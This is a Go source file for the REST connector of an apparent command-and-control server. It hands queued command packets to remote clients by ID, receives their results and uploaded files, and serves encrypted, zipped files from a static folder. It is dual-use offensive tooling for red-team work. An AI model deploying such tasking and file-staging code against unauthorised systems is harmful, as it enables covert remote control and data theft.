package server

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"

	"github.com/dobin/antnium/pkg/campaign"
	"github.com/dobin/antnium/pkg/common"
	"github.com/dobin/antnium/pkg/model"
	"github.com/gorilla/mux"
	log "github.com/sirupsen/logrus"
)

type ConnectorRest struct {
	coder      model.Coder
	middleware *Middleware
	campaign   *campaign.Campaign
}

func MakeConnectorRest(campaign *campaign.Campaign, middleware *Middleware) ConnectorRest {
	c := ConnectorRest{
		campaign:   campaign,
		middleware: middleware,
		coder:      model.MakeCoder(campaign),
	}
	return c
}

// getPacket provides a client with new packets, if any
func (co *ConnectorRest) getPacket(rw http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	clientId := vars["clientId"]

	if clientId == "" {
		return
	}

	packet, ok := co.middleware.ClientPacketRetrieve(clientId, r.RemoteAddr, "rest")
	if !ok {
		// No packet, just return
		return
	}

	// Encode the packet and send it
	jsonData, err := co.coder.EncodeData(packet)
	if err != nil {
		return
	}

	common.LogPacket("ConnectorRest:ToClient", packet)
	fmt.Fprint(rw, string(jsonData))
}

// sendPacket receives packet answers from client
func (co *ConnectorRest) sendPacket(rw http.ResponseWriter, r *http.Request) {
	reqBody, err := ioutil.ReadAll(r.Body)
	if err != nil {
		log.Error("ConnectorRest: Could not read body")
		return
	}
	packet, err := co.coder.DecodeData(reqBody)
	if err != nil {
		log.Error("ConnectorRest: Could not decode")
		return
	}

	common.LogPacket("ConnectorRest:FromClient", packet)
	co.middleware.ClientSendPacket(packet, r.RemoteAddr, "rest")
}

func (co *ConnectorRest) uploadFile(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	packetId := vars["packetId"]

	co.middleware.ClientUploadFile(packetId, r.Body)
}

// secureDownload will provide a file from static/ in encrypted form
func (co *ConnectorRest) secureDownload(rw http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	filenameEncrypted := vars["filename"]
	coder := model.MakeCoder(co.campaign)
	var err error

	// Decrypt filename
	filename, err := coder.DecryptDataB64([]byte(filenameEncrypted))
	if err != nil {
		log.Errorf("Decrypt error for %s: %s", filenameEncrypted, err.Error())
		return
	}

	var fileContent []byte
	if string(filename) == "unittest" {
		// Handle unittest here. Makes it easier
		fileContent = []byte("test")
	} else {
		// Get file
		fileContent, err = os.ReadFile("./static/" + string(filename))
		if err != nil {
			log.Errorf("Cant access file %s: %s", filename, err.Error())
			return
		}
	}

	// Data: Zip -> Encrypt -> Base64
	fileContent, err = coder.EncryptB64Zip(fileContent)
	if err != nil {
		log.Errorf("Error: %s", err.Error())
	}

	// send it
	//rw.Header().Set("Content-Type", "application/octet-stream")
	fmt.Fprint(rw, string(fileContent))
}
